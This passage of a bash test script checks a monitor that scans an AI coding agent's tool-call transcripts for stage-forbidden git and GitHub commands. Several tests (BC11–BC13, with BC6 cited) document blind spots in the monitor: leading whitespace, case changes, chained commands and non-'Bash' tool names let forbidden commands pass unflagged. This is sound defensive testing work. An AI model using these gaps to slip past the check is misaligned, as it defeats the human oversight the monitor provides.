if [[ "$bc7_rc" == "23" ]] \
   && [[ -f "$VIOLATION_BC7" ]] \
   && [[ "$(cat "$VIOLATION_BC7")" == "git checkout -B feature/eng-66-foo" ]] \
   && grep -q '\[assert\] stage=implementing transcript invoked forbidden branch-creation form: git checkout -B feature/eng-66-foo' <<<"$RENDER_OUT_BC7"; then
  pass_at "BC7 (renderer integration): branch-creation form on stage=implementing → rc=23, sidecar written, log line emitted"
else
  fail_at "BC7 renderer integration" "rc=$bc7_rc viol_exists=$([[ -f $VIOLATION_BC7 ]] && echo y || echo n) viol_body=$(cat "$VIOLATION_BC7" 2>/dev/null) out=$RENDER_OUT_BC7"
fi
rm -f "$VIOLATION_BC7"

# BC8 — cross-stage scan fires on stage="qa" (verifies D-002 has no
# stage gate). Mirror of BC7 with stage="qa" and the violation file
# at .transcript-violation-qa. Confirms the ENG-66 loop is NOT gated
# to a specific stage (in contrast to ENG-43 implementing-only and
# ENG-71 building-only).
USAGE_BC8="$ISSUE_DIR/usage-qa-BC8.json"
RAW_BC8="$ISSUE_DIR/.raw-stream.ndjson.tmp"
VIOLATION_BC8="$ISSUE_DIR/.transcript-violation-qa"
rm -f "$USAGE_BC8" "$RAW_BC8" "$VIOLATION_BC8"

bc8_rc=0
RENDER_OUT_BC8="$(
  _render_and_capture_stream "$USAGE_BC8" "$ISSUE_DIR" "qa" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc8","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git switch -c feature/eng-66-qa"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || bc8_rc=$?

if [[ "$bc8_rc" == "23" ]] \
   && [[ -f "$VIOLATION_BC8" ]] \
   && [[ "$(cat "$VIOLATION_BC8")" == "git switch -c feature/eng-66-qa" ]] \
   && grep -q '\[assert\] stage=qa transcript invoked forbidden branch-creation form: git switch -c feature/eng-66-qa' <<<"$RENDER_OUT_BC8"; then
  pass_at "BC8 (cross-stage gating): branch-creation form on stage=qa → rc=23 (D-002 no-stage-gate verified)"
else
  fail_at "BC8 cross-stage gating" "rc=$bc8_rc viol_exists=$([[ -f $VIOLATION_BC8 ]] && echo y || echo n) viol_body=$(cat "$VIOLATION_BC8" 2>/dev/null) out=$RENDER_OUT_BC8"
fi
rm -f "$VIOLATION_BC8"

# ─── QA-authored adversarial fixtures (AT1-AT5; ENG-43 not in Failure Mode → Test Map) ─
# AS1-AS6 cover the helper in isolation. AT1-AT5 cover gaps the plan
# explicitly accepted as "implicit" or didn't enumerate — most importantly
# the renderer-wrapper integration (gating, sidecar write, pre-clean) which
# AS1-AS6 do not exercise at all.

# ─── AT1: renderer integration, stage="implementing" + match → rc=22, sidecar, log ─
# AS1-AS6 exercise the helper directly. None test that
# _render_and_capture_stream actually fires the assertion when stage is
# implementing, writes the sidecar to $issue_dir/.transcript-violation-implementing,
# logs the matched command, and returns 22. Pin the renderer wrapper end-to-end.
USAGE_AT1="$ISSUE_DIR/usage-implementing-AT1.json"
RAW_AT1="$ISSUE_DIR/.raw-stream.ndjson.tmp"
VIOLATION_AT1="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_AT1" "$RAW_AT1" "$VIOLATION_AT1"

at1_rc=0
RENDER_OUT_AT1="$(
  _render_and_capture_stream "$USAGE_AT1" "$ISSUE_DIR" "implementing" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at1","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title at1 --body forbidden"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || at1_rc=$?

if [[ "$at1_rc" == "22" ]] \
   && [[ -f "$VIOLATION_AT1" ]] \
   && [[ "$(cat "$VIOLATION_AT1")" == "gh pr create --title at1 --body forbidden" ]] \
   && grep -q '\[assert\] implement-stage transcript invoked forbidden tool: gh pr create --title at1 --body forbidden' <<<"$RENDER_OUT_AT1"; then
  pass_at "AT1 (renderer integration): stage=implementing+match → rc=22, sidecar written, log line emitted"
else
  fail_at "AT1 renderer integration" "rc=$at1_rc viol_exists=$([[ -f $VIOLATION_AT1 ]] && echo y || echo n) viol_body=$(cat "$VIOLATION_AT1" 2>/dev/null) out=$RENDER_OUT_AT1"
fi
rm -f "$VIOLATION_AT1"

# ─── AT2: renderer cross-stage gating: stage="planning" + match in transcript → rc=0 ─
# Verify the stage gate actually works. A non-implementing stage with a
# transcript that *would* match must not trigger the assertion, must not
# write any sidecar (neither .transcript-violation-implementing nor
# .transcript-violation-planning), and must return 0.
USAGE_AT2="$ISSUE_DIR/usage-planning-AT2.json"
VIOLATION_AT2_IMPL="$ISSUE_DIR/.transcript-violation-implementing"
VIOLATION_AT2_PLAN="$ISSUE_DIR/.transcript-violation-planning"
rm -f "$USAGE_AT2" "$ISSUE_DIR/.raw-stream.ndjson.tmp" "$VIOLATION_AT2_IMPL" "$VIOLATION_AT2_PLAN"
# ENG-106: AT2 runs with stage=planning, so the progress.md detective fires.
# Provide a valid progress.md to satisfy the detective (the cross-stage gating
# being tested is the implement-stage gh-pr-create gate, not the progress.md gate).
export PIPELINE_DISPATCH_ID="ENG-T-COST-d0001-AT2"
cat > "$ISSUE_DIR/progress.md" <<'MD'
## ENG-T-COST-d0001-AT2 - planning - 2026-05-16T05:00:00Z

- AT2 test entry satisfying the progress.md detective
MD

at2_rc=0
_render_and_capture_stream "$USAGE_AT2" "$ISSUE_DIR" "planning" >/dev/null 2>&1 <<'NDJSON' || at2_rc=$?
{"type":"system","subtype":"init","session_id":"at2","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title at2-should-be-ignored"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON

if [[ "$at2_rc" == "0" ]] \
   && [[ ! -f "$VIOLATION_AT2_IMPL" ]] \
   && [[ ! -f "$VIOLATION_AT2_PLAN" ]]; then
  pass_at "AT2 (cross-stage gating): stage=planning with matching transcript → rc=0, no sidecar"
else
  fail_at "AT2 cross-stage gating" "rc=$at2_rc viol_impl=$([[ -f $VIOLATION_AT2_IMPL ]] && echo y || echo n) viol_plan=$([[ -f $VIOLATION_AT2_PLAN ]] && echo y || echo n)"
fi
rm -f "$VIOLATION_AT2_IMPL" "$VIOLATION_AT2_PLAN" "$ISSUE_DIR/progress.md"
unset PIPELINE_DISPATCH_ID

# ─── AT3: renderer pre-cleans stale sidecar from prior crashed dispatch ───
# Plan §4 row "Sidecar present from a prior crashed dispatch" is marked
# "implicit (single-line rm -f in Task 2) — covered by code review".
# Promote that to a real test: pre-seed a stale sidecar, run the renderer
# with implementing stage and a *clean* transcript, and verify the stale
# sidecar is removed and no new one is written.
USAGE_AT3="$ISSUE_DIR/usage-implementing-AT3.json"
VIOLATION_AT3="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_AT3" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
printf 'stale gh pr create --title leftover-from-prior-crash\n' > "$VIOLATION_AT3"
[[ -s "$VIOLATION_AT3" ]] || die "AT3 setup failed: stale sidecar not seeded"

at3_rc=0
_render_and_capture_stream "$USAGE_AT3" "$ISSUE_DIR" "implementing" >/dev/null 2>&1 <<'NDJSON' || at3_rc=$?
{"type":"system","subtype":"init","session_id":"at3","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git status"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON

if [[ "$at3_rc" == "0" ]] && [[ ! -f "$VIOLATION_AT3" ]]; then
  pass_at "AT3 (pre-clean stale sidecar): renderer entry rm -f removed prior-crash .transcript-violation-implementing"
else
  fail_at "AT3 pre-clean stale sidecar" "rc=$at3_rc viol_exists=$([[ -f $VIOLATION_AT3 ]] && echo y || echo n) viol_contents=$(cat "$VIOLATION_AT3" 2>/dev/null)"
fi
rm -f "$VIOLATION_AT3"

# ─── AT4: helper multi-match ordering — head -1 returns the FIRST match ───
# Plan §4 row "Multiple matching tool_use blocks" is marked "implicit
# (jq stream order; AS1 already exercises a single match)". AS1 has one
# match, so it cannot pin first-vs-last. Pin "first wins" so a future
# refactor (e.g. swapping head -1 for tail -1, or moving to a sort-by
# filter) breaks loudly.
TX_AT4="$_TEST_STUB_DIR/tx-at4.ndjson"
cat > "$TX_AT4" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at4","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title FIRST"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title SECOND"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title THIRD"}}]}}
NDJSON
out_at4="$(assert_no_tool_invocation "$TX_AT4" "gh pr create")" && rc_at4=0 || rc_at4=$?
if [[ "$rc_at4" == "1" && "$out_at4" == "gh pr create --title FIRST" ]]; then
  pass_at "AT4 (multi-match): head -1 returns the FIRST match (not last); rc=1, first command on stdout"
else
  fail_at "AT4 multi-match" "rc=$rc_at4 out=$out_at4"
fi

# ─── AT5: pattern with regex metacharacters → literal startswith, not regex ──
# Plan §4 row "Pattern contains regex metacharacters" is "implicit (jq
# semantics)". jq's startswith is a literal-string match. Pin: pattern
# "gh pr create.*" matches "gh pr create.*foo" (literal `.*` characters)
# but NOT "gh pr create --title x" (which would match if `.*` were a
# regex wildcard). A future refactor swapping to `test($p)` or `match($p)`
# would silently broaden the match surface.
TX_AT5="$_TEST_STUB_DIR/tx-at5.ndjson"
cat > "$TX_AT5" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at5","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title would-match-if-regex"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create.*literal-dot-star"}}]}}
NDJSON
out_at5="$(assert_no_tool_invocation "$TX_AT5" "gh pr create.*")" && rc_at5=0 || rc_at5=$?
if [[ "$rc_at5" == "1" && "$out_at5" == "gh pr create.*literal-dot-star" ]]; then
  pass_at "AT5 (regex literal): pattern \"gh pr create.*\" matched as literal characters; \"gh pr create --title …\" not matched"
else
  fail_at "AT5 regex literal" "rc=$rc_at5 out=$out_at5"
fi

# ─── AT6: renderer integration, stage="building" + match → rc=26, sidecar, log ─
# AS7-AS12 cover the helper. AT6 covers the renderer-wrapper end-to-end
# for the build path: gating, sidecar write, pre-clean, log emission.
USAGE_AT6="$ISSUE_DIR/usage-building-AT6.json"
RAW_AT6="$ISSUE_DIR/.raw-stream.ndjson.tmp"
VIOLATION_AT6="$ISSUE_DIR/.transcript-violation-building"
rm -f "$USAGE_AT6" "$RAW_AT6" "$VIOLATION_AT6"

at6_rc=0
RENDER_OUT_AT6="$(
  _render_and_capture_stream "$USAGE_AT6" "$ISSUE_DIR" "building" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at6","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout main"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || at6_rc=$?

if [[ "$at6_rc" == "26" ]] \
   && [[ -f "$VIOLATION_AT6" ]] \
   && [[ "$(cat "$VIOLATION_AT6")" == "git checkout main" ]] \
   && grep -q '\[assert\] build-stage transcript invoked forbidden tool: git checkout main' <<<"$RENDER_OUT_AT6"; then
  pass_at "AT6 (renderer integration): stage=building+match → rc=26, sidecar written, log line emitted"
else
  fail_at "AT6 renderer integration" "rc=$at6_rc viol_exists=$([[ -f $VIOLATION_AT6 ]] && echo y || echo n) viol_body=$(cat "$VIOLATION_AT6" 2>/dev/null) out=$RENDER_OUT_AT6"
fi
rm -f "$VIOLATION_AT6"

# ─── AT7: renderer cross-stage gating, stage="qa" + match → rc=0 ─
# The building-stage block must not fire on non-building stages. Mirror
# of AT2 for the building-stage gate.
USAGE_AT7="$ISSUE_DIR/usage-qa-AT7.json"
VIOLATION_AT7_BUILD="$ISSUE_DIR/.transcript-violation-building"
VIOLATION_AT7_QA="$ISSUE_DIR/.transcript-violation-qa"
rm -f "$USAGE_AT7" "$ISSUE_DIR/.raw-stream.ndjson.tmp" "$VIOLATION_AT7_BUILD" "$VIOLATION_AT7_QA"

at7_rc=0
_render_and_capture_stream "$USAGE_AT7" "$ISSUE_DIR" "qa" >/dev/null 2>&1 <<'NDJSON' || at7_rc=$?
{"type":"system","subtype":"init","session_id":"at7","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout main-should-be-ignored-on-qa"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON

if [[ "$at7_rc" == "0" ]] \
   && [[ ! -f "$VIOLATION_AT7_BUILD" ]] \
   && [[ ! -f "$VIOLATION_AT7_QA" ]]; then
  pass_at "AT7 (cross-stage gating): stage=qa with matching transcript → rc=0, no sidecar"
else
  fail_at "AT7 cross-stage gating" "rc=$at7_rc viol_build=$([[ -f $VIOLATION_AT7_BUILD ]] && echo y || echo n) viol_qa=$([[ -f $VIOLATION_AT7_QA ]] && echo y || echo n)"
fi
rm -f "$VIOLATION_AT7_BUILD" "$VIOLATION_AT7_QA"

# ─── ENG-71 QA-authored adversarial fixtures (AT8-AT11) ───────────────
# AS7-AS12 + AT6-AT7 cover the FM-Map. AT8-AT11 close the gaps a cold
# sub-agent (general-purpose, May-2026 invocation) flagged as untested:
#   AT8  — `tool_use` for a non-Bash tool with `.input.command`
#          starting with the pattern must NOT match (the helper's
#          `.name == "Bash"` discriminator is the contract).
#   AT9  — assistant `.message.content[]` mixing `text` blocks AND
#          `tool_use` blocks must still scan the tool_use entries
#          (regression guard: `.message.content[]?` iterator must
#          not get short-circuited to first element).
#   AT10 — first-pattern-first-match precedence at the renderer-wrapper
#          level: when the transcript contains BOTH a `git pull` AND a
#          `git checkout` tool_use (in either NDJSON order), the loop's
#          declared pattern order (`git checkout` first) determines the
#          violation reported in the sidecar. This is loop-order, not
#          transcript-order — operators reading the violation see the
#          loop-order winner, NOT necessarily the temporally-first
#          forbidden command. Pinning this prevents a refactor that
#          re-orders the `for _pat in …` loop from silently changing
#          the operator-facing diagnostic.
#   AT11 — null/missing `.input.command` (`{"input":{}}` with no
#          `command` field) must NOT crash the matcher and must NOT
#          spuriously match (the `// ""` defaults to empty, which
#          startswith($p) returns true for ANY non-empty pattern by
#          jq's startswith definition? — actually startswith on empty
#          string returns false except when $p is also empty, but the
#          contract is "no false positive on missing command"; this
#          fixture pins that contract end-to-end).
printf '\n--- ENG-71: QA-authored adversarial AT8-AT11 ---\n'

# AT8 — non-Bash tool with `.input.command` starting with the pattern → NO MATCH.
TX_AT8="$_TEST_STUB_DIR/tx-at8.ndjson"
cat > "$TX_AT8" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at8","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Read","input":{"command":"git checkout main"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"command":"git switch feature"}}]}}
NDJSON
at8_failures=0
for _pat in 'git checkout' 'git switch' 'git pull' 'git reset'; do
  out_at8="$(assert_no_tool_invocation "$TX_AT8" "$_pat")" && rc_at8=0 || rc_at8=$?
  if [[ "$rc_at8" != "0" || -n "$out_at8" ]]; then
    at8_failures=$((at8_failures+1))
    fail_at "AT8 ($_pat non-Bash discriminator)" "rc=$rc_at8 out=$out_at8 (expected rc=0; tool_use was Read/Edit, not Bash)"
  fi
done
if [[ "$at8_failures" == "0" ]]; then
  pass_at "AT8: non-Bash tool_use with .input.command matching pattern → rc=0 (the .name == \"Bash\" discriminator holds)"
fi

# AT9 — assistant.message.content array mixes text + tool_use; the matcher
# must still find the tool_use match when text blocks share the array.
TX_AT9="$_TEST_STUB_DIR/tx-at9.ndjson"
cat > "$TX_AT9" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at9","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"I will sync main now."},{"type":"tool_use","name":"Bash","input":{"command":"git checkout main"}},{"type":"text","text":"Done."}]}}
NDJSON
out_at9="$(assert_no_tool_invocation "$TX_AT9" "git checkout")" && rc_at9=0 || rc_at9=$?
if [[ "$rc_at9" == "1" && "$out_at9" == "git checkout main" ]]; then
  pass_at "AT9: text+tool_use mixed in same content[] → matcher finds tool_use match (rc=1)"
else
  fail_at "AT9 mixed content[] iteration" "rc=$rc_at9 out=$out_at9 (expected rc=1, out='git checkout main' — content[]? must iterate all members regardless of type)"
fi

# AT10 — renderer-wrapper integration with two distinct forbidden patterns
# in the SAME transcript. NDJSON has `git pull` BEFORE `git checkout`, but
# the for-loop in dispatch.sh iterates patterns in order
# `git checkout, git switch, git pull, git reset` — so `git checkout` is
# tested first and short-circuits via `return 26` before `git pull` is
# checked. Pin loop-order-first-match: violation_file holds the
# `git checkout` command, NOT the temporally-first `git pull` command.
USAGE_AT10="$ISSUE_DIR/usage-building-AT10.json"
VIOLATION_AT10="$ISSUE_DIR/.transcript-violation-building"
rm -f "$USAGE_AT10" "$ISSUE_DIR/.raw-stream.ndjson.tmp" "$VIOLATION_AT10"

at10_rc=0
RENDER_OUT_AT10="$(
  _render_and_capture_stream "$USAGE_AT10" "$ISSUE_DIR" "building" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at10","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git pull --ff-only origin main"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout main"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || at10_rc=$?

if [[ "$at10_rc" == "26" ]] \
   && [[ -f "$VIOLATION_AT10" ]] \
   && [[ "$(cat "$VIOLATION_AT10")" == "git checkout main" ]]; then
  pass_at "AT10 (loop-order precedence): two forbidden tool_use blocks (git pull then git checkout) → sidecar holds 'git checkout main' (loop iterates git checkout first)"
else
  fail_at "AT10 loop-order precedence" "rc=$at10_rc viol_body=$(cat "$VIOLATION_AT10" 2>/dev/null) (expected rc=26, sidecar='git checkout main' regardless of NDJSON order)"
fi
rm -f "$VIOLATION_AT10"

# AT11 — tool_use with empty `.input` object (no `.command` field). The
# `// ""` default in the jq filter must coerce missing command to empty
# string; startswith($p) on an empty string returns false for any
# non-empty $p. No match, no crash.
TX_AT11="$_TEST_STUB_DIR/tx-at11.ndjson"
cat > "$TX_AT11" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at11","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":""}}]}}
NDJSON
at11_failures=0
for _pat in 'git checkout' 'git switch' 'git pull' 'git reset'; do
  out_at11="$(assert_no_tool_invocation "$TX_AT11" "$_pat")" && rc_at11=0 || rc_at11=$?
  if [[ "$rc_at11" != "0" || -n "$out_at11" ]]; then
    at11_failures=$((at11_failures+1))
    fail_at "AT11 ($_pat null/empty command)" "rc=$rc_at11 out=$out_at11 (expected rc=0; missing/empty .input.command must coerce to empty)"
  fi
done
if [[ "$at11_failures" == "0" ]]; then
  pass_at "AT11: null/missing/empty .input.command on Bash tool_use → rc=0 for all four patterns (no crash, no false positive)"
fi

# ─── ENG-66 QA-authored adversarial fixtures (BC9-BC13) ──────────────
# BC1-BC8 cover each banned form, the canonical-checkout passthrough,
# the chained-command blind spot, and renderer integration on two
# stages. BC9-BC13 close the gaps a cold sub-agent flagged as worth
# pinning that the plan's Failure Mode → Test Map handled implicitly:
#
#   BC9  — multi-pattern transcript: TWO ENG-66 banned forms in the
#          same NDJSON. Pattern loop iterates `-b → -B → -m → -c`;
#          pin sidecar holds the FIRST-iterated-pattern winner, NOT
#          the temporally-first violation. Mirror of AT10 for the
#          ENG-66 loop.
#   BC10 — cross-loop interaction with ENG-68: transcript contains
#          both `git checkout -b foo` AND `git config core.bare true`.
#          ENG-66 loop is positioned BEFORE the ENG-68 block in
#          _render_and_capture_stream, so rc=23 fires first; ENG-68's
#          rc=13 is never evaluated. Sidecar reflects branch-creation
#          violation only. Pin to prevent reorder regression.
#   BC11 — leading-whitespace bypass: `.input.command = "  git
#          checkout -b foo"`. startswith("git checkout -b") is false
#          on a leading-space input — pin the inherited startswith
#          blind spot for the negative case (rc=0). Documents the
#          gap so a future jq `ltrimstr` upgrade is intentional.
#   BC12 — case-sensitivity: `.input.command = "GIT CHECKOUT -B foo"`
#          and `Git checkout -b bar`. startswith is byte-literal so
#          neither matches; rc=0 for all four patterns. Pin negative
#          behavior; macOS HFS+ is case-insensitive at the FS layer
#          but the matcher is at the string layer.
#   BC13 — non-Bash tool name: `.name = "bash"` (lowercase) carrying
#          a banned command. The jq filter requires `.name == "Bash"`
#          (capital-B); lowercase is dropped silently. Pin rc=0 for
#          all four patterns. Mirror of AT8 (which pins this for the
#          ENG-71 patterns).
printf '\n--- ENG-66: QA-authored adversarial BC9-BC13 ---\n'

# BC9 — multi-pattern transcript: `git switch -c foo` BEFORE `git checkout -b bar`
# in NDJSON order, but loop iterates `-b → -B → -m → -c` so `git checkout -b`
# is checked first. Sidecar must hold `git checkout -b bar` (loop-first
# winner), not `git switch -c foo` (temporally-first violation).
USAGE_BC9="$ISSUE_DIR/usage-implementing-BC9.json"
VIOLATION_BC9="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_BC9" "$ISSUE_DIR/.raw-stream.ndjson.tmp" "$VIOLATION_BC9"

bc9_rc=0
RENDER_OUT_BC9="$(
  _render_and_capture_stream "$USAGE_BC9" "$ISSUE_DIR" "implementing" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc9","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git switch -c feature/eng-66-foo"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout -b feature/eng-66-bar"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || bc9_rc=$?

if [[ "$bc9_rc" == "23" ]] \
   && [[ -f "$VIOLATION_BC9" ]] \
   && [[ "$(cat "$VIOLATION_BC9")" == "git checkout -b feature/eng-66-bar" ]]; then
  pass_at "BC9 (multi-pattern loop-order): two ENG-66 violations in transcript → sidecar holds 'git checkout -b ...' (loop-first winner, not NDJSON-first)"
else
  fail_at "BC9 multi-pattern loop-order" "rc=$bc9_rc viol_body=$(cat "$VIOLATION_BC9" 2>/dev/null) (expected rc=23, sidecar='git checkout -b feature/eng-66-bar' regardless of NDJSON order)"
fi
rm -f "$VIOLATION_BC9"

# BC10 — cross-loop interaction: ENG-66 fires before ENG-68. Transcript
# carries BOTH `git checkout -b foo` (ENG-66 violation) AND `git config
# core.bare true` (ENG-68 violation). _render_and_capture_stream's
# ENG-66 block sits BEFORE ENG-68 in source order; rc=23 must short-
# circuit before rc=13 has a chance to fire.
USAGE_BC10="$ISSUE_DIR/usage-implementing-BC10.json"
VIOLATION_BC10="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_BC10" "$ISSUE_DIR/.raw-stream.ndjson.tmp" "$VIOLATION_BC10"

bc10_rc=0
RENDER_OUT_BC10="$(
  _render_and_capture_stream "$USAGE_BC10" "$ISSUE_DIR" "implementing" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc10","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git config core.bare true"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout -b feature/eng-66-x"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || bc10_rc=$?

if [[ "$bc10_rc" == "23" ]] \
   && [[ -f "$VIOLATION_BC10" ]] \
   && [[ "$(cat "$VIOLATION_BC10")" == "git checkout -b feature/eng-66-x" ]]; then
  pass_at "BC10 (ENG-66 ↑ ENG-68 ordering): transcript with both violations → rc=23 fires first, sidecar reflects branch-creation"
else
  fail_at "BC10 ENG-66/ENG-68 ordering" "rc=$bc10_rc viol_body=$(cat "$VIOLATION_BC10" 2>/dev/null) (expected rc=23, ENG-66 must short-circuit before ENG-68's rc=13)"
fi
rm -f "$VIOLATION_BC10"

# BC11 — leading-whitespace bypass. `.input.command = "  git checkout -b foo"`
# starts with two spaces; jq's startswith("git checkout -b") returns false.
# Pin the inherited startswith blind spot — same family as BC6 (chained
# commands). Documents the gap so a future ltrimstr/normalization
# upgrade does not silently flip behavior without an audit.
TX_BC11="$_TEST_STUB_DIR/tx-bc11.ndjson"
cat > "$TX_BC11" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc11","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"  git checkout -b feature/eng-99-foo"}}]}}
NDJSON
out_bc11="$(assert_no_tool_invocation "$TX_BC11" "git checkout -b")" && rc_bc11=0 || rc_bc11=$?
if [[ "$rc_bc11" == "0" && -z "$out_bc11" ]]; then
  pass_at "BC11: leading-whitespace bypass — '  git checkout -b feature/eng-99-foo' does NOT match (startswith blind spot, negative pin)"
else
  fail_at "BC11 leading-whitespace bypass" "rc=$rc_bc11 out=$out_bc11 (expected rc=0; startswith is byte-literal — leading whitespace must NOT match)"
fi

# BC12 — case-sensitivity. startswith is a byte-literal compare; uppercase
# `GIT CHECKOUT -B foo` and mixed-case `Git checkout -b bar` must NOT match.
# Pin negative behavior so a future case-fold upgrade is intentional.
TX_BC12="$_TEST_STUB_DIR/tx-bc12.ndjson"
cat > "$TX_BC12" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc12","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"GIT CHECKOUT -B feature/eng-99-foo"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"Git checkout -b feature/eng-99-bar"}}]}}
NDJSON
bc12_failures=0
for _pat in 'git checkout -b' 'git checkout -B' 'git branch -m' 'git switch -c'; do
  out_bc12="$(assert_no_tool_invocation "$TX_BC12" "$_pat")" && rc_bc12=0 || rc_bc12=$?
  if [[ "$rc_bc12" != "0" || -n "$out_bc12" ]]; then
    bc12_failures=$((bc12_failures+1))
    fail_at "BC12 ($_pat case-variant)" "rc=$rc_bc12 out=$out_bc12 (expected rc=0; startswith is case-sensitive)"
  fi
done
if [[ "$bc12_failures" == "0" ]]; then
  pass_at "BC12: case-variant — 'GIT CHECKOUT -B …' and 'Git checkout -b …' do NOT match any of the four patterns (startswith is byte-literal)"
fi

# BC13 — non-Bash tool name: `.name = "bash"` (lowercase) with a banned
# command. The jq filter at bin/dispatch.sh:56 requires `.name == "Bash"`;
# lowercase variants are silently filtered out before pattern matching.
# Pin rc=0 to surface the contract that the discriminator is strict-equals
# on the canonical capital-B name. Mirror of AT8 for ENG-66 patterns.
TX_BC13="$_TEST_STUB_DIR/tx-bc13.ndjson"
cat > "$TX_BC13" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc13","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"bash","input":{"command":"git checkout -b feature/eng-99-foo"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Shell","input":{"command":"git switch -c feature/eng-99-bar"}}]}}
NDJSON
bc13_failures=0
for _pat in 'git checkout -b' 'git checkout -B' 'git branch -m' 'git switch -c'; do
  out_bc13="$(assert_no_tool_invocation "$TX_BC13" "$_pat")" && rc_bc13=0 || rc_bc13=$?
  if [[ "$rc_bc13" != "0" || -n "$out_bc13" ]]; then
    bc13_failures=$((bc13_failures+1))
    fail_at "BC13 ($_pat non-Bash tool name)" "rc=$rc_bc13 out=$out_bc13 (expected rc=0; .name == \"Bash\" discriminator excludes lowercase 'bash' and 'Shell')"
  fi
done
if [[ "$bc13_failures" == "0" ]]; then
  pass_at "BC13: tool_use with .name=\"bash\" (lowercase) or \"Shell\" carrying banned commands → rc=0 for all four patterns (.name == \"Bash\" discriminator holds)"
